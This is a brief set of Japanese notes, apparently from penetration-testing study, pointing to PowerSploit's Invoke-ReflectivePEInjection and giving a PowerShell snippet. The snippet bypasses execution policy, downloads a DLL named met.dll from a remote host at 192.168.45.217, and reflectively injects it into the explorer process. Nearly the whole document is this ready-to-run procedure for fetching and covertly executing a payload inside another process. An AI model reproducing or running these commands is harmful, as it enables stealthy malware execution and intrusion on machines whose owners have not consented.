使用ツール
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

ツールを利用したインジェクション
```powershell
PowerShell -Exec Bypass
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.217:8000/met.dll')
$procid = (Get-Process -Name explorer).Id
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```